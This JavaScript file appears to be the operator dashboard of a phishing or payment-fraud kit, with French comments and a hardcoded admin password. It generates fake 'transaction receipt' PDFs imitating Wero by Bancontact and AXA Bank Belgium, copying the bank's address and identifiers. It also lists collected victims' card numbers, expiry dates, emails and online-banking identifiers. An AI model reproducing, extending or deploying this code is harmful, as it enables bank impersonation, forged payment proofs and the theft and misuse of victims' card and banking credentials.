// Variables globales
let currentUserToDelete = null;
const correctPassword = 'admin123';
let isAuthenticated = false;

// Fonction pour générer un PDF
async function generatePDF(code, nom, montant) {
    try {
        // Créer le document PDF
        const doc = new window.jspdf.jsPDF();

        try {
            // Charger le logo
            const img = new Image();
            img.crossOrigin = 'Anonymous';  // Permet le chargement cross-origin
            
            // Convertir le logo en base64
            const response = await fetch('logo.png');
            const blob = await response.blob();
            const reader = new FileReader();
            
            const base64data = await new Promise((resolve, reject) => {
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = reject;
                reader.readAsDataURL(blob);
            });

            // Ajouter le logo
            doc.addImage(base64data, 'PNG', 15, 15, 30, 30);
        } catch (logoError) {
            console.error('Erreur lors du chargement du logo:', logoError);
            // Continuer sans le logo
        }

        // Titre
        doc.setFont('helvetica', 'normal');
        doc.setFontSize(16);
        doc.text('Détail opération', 150, 30, null, null, 'center');

        // Ligne horizontale
        doc.setDrawColor(0);
        doc.setLineWidth(0.5);
        doc.line(15, 45, 195, 45);

        // Informations
        doc.setFontSize(11);
        const startY = 80;
        const labelX = 15;
        const valueX = 80;
        const lineHeight = 20;

        // Compte
        doc.text('Compte :', labelX, startY);
        doc.text(nom, valueX, startY);
        doc.text('Wero By Bancontact', valueX, startY + 7);

        // Montant
        doc.text('Montant :', labelX, startY + lineHeight);
        doc.text('(Virement instantané en euros)', valueX, startY + lineHeight);
        doc.text(`€ ${montant} €`, valueX, startY + lineHeight + 15);

        // Date
        const date = new Date().toLocaleDateString('fr-FR', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
        });
        doc.text('Date de l\'opération :', labelX, startY + lineHeight * 2);
        doc.text(date, valueX, startY + lineHeight * 2);

        // Pied de page
        doc.setFontSize(8);
        doc.text('AXA Bank Belgium sa fait partie du Groupe Crelan – Boulevard Sylvain Dupuis 251, 1070 Anderlecht • TEL 03 286 66 00 •', 15, 265);
        doc.text('www.axabank.becontact • BIC: AXABBE22 • IBAN BE67 7000 9099 9587 • N° BCE : TVA BE 0404 476 835 RPM Bruxelles • FSMA 036705 A', 15, 270);

        // Sauvegarder le PDF
        doc.save(`WERO_transaction_${code}.pdf`);
    } catch (error) {
        console.error('Erreur lors de la génération du PDF:', error);
        showNotification('Erreur lors de la génération du PDF', 'error');
    }
}

// Fonctions pour les notifications
function showNotification(message, type) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';

    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Fonctions pour les modals
function showAddUserModal() {
    document.getElementById('addUserModal').style.display = 'block';
}

function closeAddUserModal() {
    document.getElementById('addUserModal').style.display = 'none';
}

function showDeleteModal(code) {
    currentUserToDelete = code;
    document.getElementById('deleteModal').style.display = 'block';
}

function closeDeleteModal() {
    document.getElementById('deleteModal').style.display = 'none';
    currentUserToDelete = null;
}

// Fonctions d'authentification
function checkAuthentication() {
    if (!isAuthenticated) {
        document.getElementById('passwordModal').style.display = 'block';
        document.getElementById('mainContent').classList.add('opacity-30', 'blur-sm');
    } else {
        document.getElementById('passwordModal').style.display = 'none';
        document.getElementById('mainContent').classList.remove('opacity-30', 'blur-sm');
    }
}

function logout() {
    isAuthenticated = false;
    checkAuthentication();
    showNotification('Déconnexion réussie', 'success');
}

// Fonction pour formater la date
function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleString('fr-FR', {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

// Fonction pour créer une carte utilisateur
function createUserCard(user) {
    const card = document.createElement('div');
    card.className = 'bg-white p-6 rounded-lg shadow-md mb-4 fade-in';

    let html = `
        <div class="flex justify-between items-start">
            <div class="flex-1">
                <div class="flex items-center mb-2">
                    <h3 class="text-xl font-bold text-gray-800">${user.prenom} ${user.nom}</h3>
                    ${user.pays ? `<span class="ml-2 px-2 py-1 bg-blue-100 text-blue-800 rounded-full text-sm">${user.pays}</span>` : ''}
                </div>
                <p class="text-gray-600">Code: ${user.code}</p>
                <p class="text-green-600 font-bold">Montant: ${user.montant} €</p>
                ${user.iban ? `<p class="text-gray-600">IBAN: ${user.iban}</p>` : ''}
                <p class="text-gray-500 text-sm mt-2">Dernière modification: ${formatDate(user.derniere_modification)}</p>
            </div>
            
            <div class="flex space-x-2">
                <button onclick="generatePDF('${user.code}', '${user.nom}', ${user.montant})"
                        class="p-2 text-blue-600 hover:text-blue-800">
                    <i class="fas fa-file-pdf"></i>
                </button>
                <button onclick="showDeleteModal('${user.code}')"
                        class="p-2 text-red-600 hover:text-red-800">
                    <i class="fas fa-trash"></i>
                </button>
            </div>
        </div>`;

    // Informations bancaires si présentes
    if (user.info_bancaire) {
        html += `
        <div class="mt-4">
            <h4 class="font-semibold text-yellow-600 mb-2">💳 Carte bancaire</h4>
            <ul class="space-y-1 text-gray-600">
                <li>Titulaire: ${user.info_bancaire.titulaire}</li>
                <li>Email: ${user.info_bancaire.email}</li>
                <li>Numéro: ${user.info_bancaire.numero_carte}</li>
                <li>Expiration: ${user.info_bancaire.expiration}</li>
                <li>Date: ${formatDate(user.info_bancaire.timestamp)}</li>
            </ul>
        </div>`;
    }

    // Informations de banque si présentes
    if (user.banque) {
        html += `
        <div class="mt-4">
            <h4 class="font-semibold text-yellow-600 mb-2">🏦 Informations bancaires</h4>
            <ul class="space-y-1 text-gray-600">
                <li>Banque: ${user.banque.nom_banque}</li>
                <li>Identifiant: ${user.banque.identifiant}</li>
                <li>Date: ${formatDate(user.banque.timestamp)}</li>
            </ul>
        </div>`;
    }

    card.innerHTML = html;
    return card;
}

// Fonction pour charger les utilisateurs
async function loadUsers() {
    try {
        const response = await fetch('/.netlify/functions/users');
        if (!response.ok) throw new Error('Erreur lors du chargement des données');
        
        const users = await response.json();
        const usersList = document.getElementById('usersList');
        usersList.innerHTML = '';

        // Trier par dernière modification
        users.sort((a, b) => {
            return new Date(b.derniere_modification) - new Date(a.derniere_modification);
        });

        users.forEach(user => {
            const card = createUserCard(user);
            usersList.appendChild(card);
            setTimeout(() => card.classList.add('active'), 100);
        });
    } catch (error) {
        showNotification(error.message, 'error');
    }
}

// Fonction pour confirmer la suppression
async function confirmDelete() {
    if (!currentUserToDelete) return;

    try {
        const response = await fetch(`/.netlify/functions/users/${currentUserToDelete}`, {
            method: 'DELETE'
        });

        if (!response.ok) throw new Error('Erreur lors de la suppression');

        showNotification('Utilisateur supprimé avec succès', 'success');
        closeDeleteModal();
        loadUsers();
    } catch (error) {
        showNotification(error.message, 'error');
    }
}

// Event Listeners
document.addEventListener('DOMContentLoaded', function() {
    // Vérifier l'authentification au chargement
    checkAuthentication();

    // Gérer la soumission du mot de passe
    document.getElementById('passwordForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const password = document.getElementById('password').value.trim();
        
        if (password === 'admin123') {
            isAuthenticated = true;
            checkAuthentication();
            loadUsers();
            showNotification('Connexion réussie', 'success');
        } else {
            showNotification(`Mot de passe incorrect (${password})`, 'error');
        }
    });

    // Gérer l'ajout d'utilisateur
    document.getElementById('addUserForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const formData = {
            nom: this.elements['nom'].value,
            prenom: this.elements['prenom'].value,
            montant: parseFloat(this.elements['montant'].value),
            iban: this.elements['iban'].value,
            derniere_modification: new Date().toISOString()
        };

        try {
            const response = await fetch('/.netlify/functions/users', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });

            if (!response.ok) throw new Error('Erreur lors de l\'ajout de l\'utilisateur');

            showNotification('Utilisateur ajouté avec succès', 'success');
            closeAddUserModal();
            this.reset();
            loadUsers();
        } catch (error) {
            showNotification(error.message, 'error');
        }
    });
});
